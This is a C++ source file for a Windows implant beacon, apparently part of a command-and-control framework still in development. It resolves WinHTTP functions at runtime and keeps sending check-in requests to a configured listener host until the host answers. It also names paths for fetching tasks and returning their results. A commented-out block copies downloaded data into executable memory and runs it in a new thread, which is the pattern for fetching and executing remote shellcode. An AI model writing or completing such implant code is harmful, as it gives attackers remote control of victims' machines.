#include <string>
#include "types.hpp"
#include "common.hpp"
#include "winhttp.hpp"

VOID Run(
	LPCWSTR lpHost,
	INTERNET_PORT nPort,
	LPCWSTR lpRequestCheckInPath,
    LPCWSTR lpRequestTaskGetPath,
    LPCWSTR lpRequestTaskResultPath,
	WinHttpFuncAddresses winHttpFuncAddresses
) {
	BOOL bResults = FALSE;
	HINTERNET hSession = NULL;
	HINTERNET hConnect = NULL;
	HINTERNET hRequest = NULL;
    BOOL bCheckIn = FALSE;
    DWORD dwSecFlags = 0;
    DWORD dwStatusCode = 0;
    DWORD dwStatusCodeSize = sizeof(dwStatusCode);

	UCHAR buffer[1024] = { 0 };
	DWORD dwBufSize = 0;
	DWORD dwBufRead = 0;
	PVOID pBuffer; // LPSTR pszOutBuffer;
	SIZE_T respSize = 0;

	hSession = winHttpFuncAddresses.lpfnWinHttpOpen(
		L"Beacon",
		WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
		WINHTTP_NO_PROXY_NAME,
		WINHTTP_NO_PROXY_BYPASS, 0
	);
	if (!hSession) {
		return;
	}

	hConnect = winHttpFuncAddresses.lpfnWinHttpConnect(hSession, lpHost, nPort, 0);
	if (!hConnect) {
        DisplayErrorMessageBox(L"WinHttpConnect failes");
		WinHttpCloseHandles(winHttpFuncAddresses.lpfnWinHttpCloseHandle, hSession, NULL, NULL);
		return;
	}

//  WinHttpSetStatusCallback(hSession, WinHttpCallback, WINHTTP_CALLBACK_FLAG_SECURE_FAILURE, 0);

    // Check in
    do
    {
        DisplayMessageBox(L"Sending CheckIn request...", L"test");
        sleep(5);

        WinHttpResponse resp = SendRequest(
            winHttpFuncAddresses,
            hConnect,
            LISTENER_HOST_W,
            LISTENER_PORT,
            REQUEST_PATH_CHECKIN_W,
            L"GET"
        );
        if (!resp.bResult) {
            DisplayErrorMessageBox(L"WinHttpSendRequest Error");
            WinHttpCloseHandles(winHttpFuncAddresses.lpfnWinHttpCloseHandle, hSession, NULL, NULL);
            return;
        }
        if (resp.dwStatusCode == 200) {
            bCheckIn = TRUE;
        }
    } while (!bCheckIn);

    DisplayMessageBox(L"CheckIn OK", L"test");

	// pBuffer = NULL;
	// do
	// {
	// 	if (!winHttpFuncAddresses.lpfnWinHttpQueryDataAvailable(hRequest, &dwBufSize))
	// 	{
	// 		DisplayMessageBox(L"WinHttpQueryDataAvailabe Error", L"test");
	// 		// printf("Error %u in WinHttpQueryDataAvailable.\n", GetLastError());
	// 	}

	// 	success = winHttpFuncAddresses.lpfnWinHttpReadData(hRequest, buffer, dwBufSize, &dwBufRead);
	// 	if (!success || dwBufRead == 0)
	// 	{
	// 		DisplayMessageBox(L"WinHttpReadData Error", L"test");
	// 		break;
	// 	}

	// 	DisplayMessageBox(L"ReadData OK", L"test");

	// 	if (!pBuffer) {
	// 		DisplayMessageBox(L"respBuffer NO", L"test");
	// 		pBuffer = LocalAlloc(LPTR, dwBufRead);
	// 	}
	// 	else {
	// 		DisplayMessageBox(L"respBuffer OK", L"test");
	// 		pBuffer = LocalReAlloc(pBuffer, respSize + dwBufRead, LMEM_MOVEABLE | LMEM_ZEROINIT);
	// 	}

		// LPVOID execMem = VirtualAlloc(NULL, dwBufRead, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		// memcpy(execMem, pBuffer, dwBufRead);
		// DWORD threadId;
		// HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)execMem, NULL, 0, &threadId);

		// WaitForSingleObject(hThread, INFINITE);
		// CloseHandle(hThread);
		// VirtualFree(execMem, 0, MEM_RELEASE);

		// respSize += dwBufRead;

		// memcpy(pBuffer + (respSize - dwBufRead), buffer, dwBufRead);
		// memset(buffer, 0, sizeof(buffer));
		// ZeroMemory(buffer, sizeof(buffer));
	// } while (success == TRUE);

	WinHttpCloseHandles(winHttpFuncAddresses.lpfnWinHttpCloseHandle, hSession, hConnect, hRequest);

    // DisplayMessageBox(L"DownloadAndExecute Finished", L"test");

	return;
}


INT WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, INT nCmdShow)
{
    INT msgBox = DisplayMessageBox(L"I'm an implant beacon.", L"test");

    HMODULE hWinHttp = LoadLibraryW((LPCWSTR)L"winhttp.dll");
    if (hWinHttp == NULL)
	{
        return EXIT_FAILURE;
    }

    WinHttpFuncAddresses winHttpFuncAddresses = WinHttpGetFuncAddresses(hWinHttp);
    if (!WinHttpCheckFuncAddresses(winHttpFuncAddresses)) {
        DisplayMessageBox(L"WinHTTP function pointers are NULL.", L"test");
        return EXIT_FAILURE;
    }

	Run(
		LISTENER_HOST_W,
		(INTERNET_PORT)LISTENER_PORT,
		REQUEST_PATH_CHECKIN_W,
        REQUEST_PATH_TASKGET_W,
        REQUEST_PATH_TASKRESULT_W,
		winHttpFuncAddresses
	);

	FreeLibrary(hWinHttp);

	return EXIT_SUCCESS;
}